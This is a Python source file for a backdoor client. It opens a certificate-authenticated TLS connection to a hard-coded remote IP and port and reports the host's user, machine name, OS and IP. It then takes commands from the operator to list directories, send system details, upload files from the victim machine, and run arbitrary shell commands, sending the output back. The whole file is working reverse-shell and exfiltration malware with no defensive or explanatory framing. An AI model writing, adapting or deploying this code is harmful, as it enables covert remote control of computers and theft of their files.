import socket
import os
import platform
import getpass
import subprocess
import ssl


HOST = "169.254.60.95"
PORT = 2222
SH = "Coles-Laptop-01"

def main():
    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile="C:/backdoor/certs/server.crt")
    ctx.load_cert_chain(certfile="C:/backdoor/certs/client.crt", keyfile="C:/backdoor/certs/client.key")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock = ctx.wrap_socket(s, server_hostname=SH) 
    sock.connect((HOST, PORT))
    head = f"{getpass.getuser()}@{platform.node()}-{platform.system()}[{socket.gethostbyname(socket.gethostname())}]"
    sock.send(head.encode())

    while True:
        try:
            sout = None
            serr = None
            cmd = sock.recv(1024).decode()
            if cmd == "server cert":
                certs = ctx.get_ca_certs()
                sock.sendall(bytes(i for i in str(certs).encode()))
            elif cmd == "cert store":
                stats = ctx.cert_store_stats()
                sock.sendall(bytes(i for i in str(stats).encode()))
            elif cmd == "list":
                dirs = str(os.listdir(".")).encode()
                sock.sendall(bytes(i for i in dirs))
            elif cmd == "sysinfo":
                info = f"""
                user: {getpass.getuser()}
                computer: {platform.node()}
                os: {platform.system()}
                """
                sock.send(info.encode())
            elif cmd.split(" ")[0] == "download":
                path = cmd.split(" ")[1]
                with open(path, "r") as fh:
                    data = fh.read(1024)
                    while True:
                        if len(data) == 0:
                            break
                        sock.send(data.encode())
                        data = fh.read(1024)
                sock.send("DONE".encode())
            elif cmd in {"q", "quit", "Q", "Quit"}:
                print("terminating...")
                sock.send(cmd.encode())
                break
            else:
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                        stdin=subprocess.PIPE)
                sout, serr = proc.communicate()
                if not sout:
                    print(serr)
                else:
                    sock.send(sout)
        except Exception as err:
            print("error: ", err, ", terminating...")
            break
    sock.close()

main()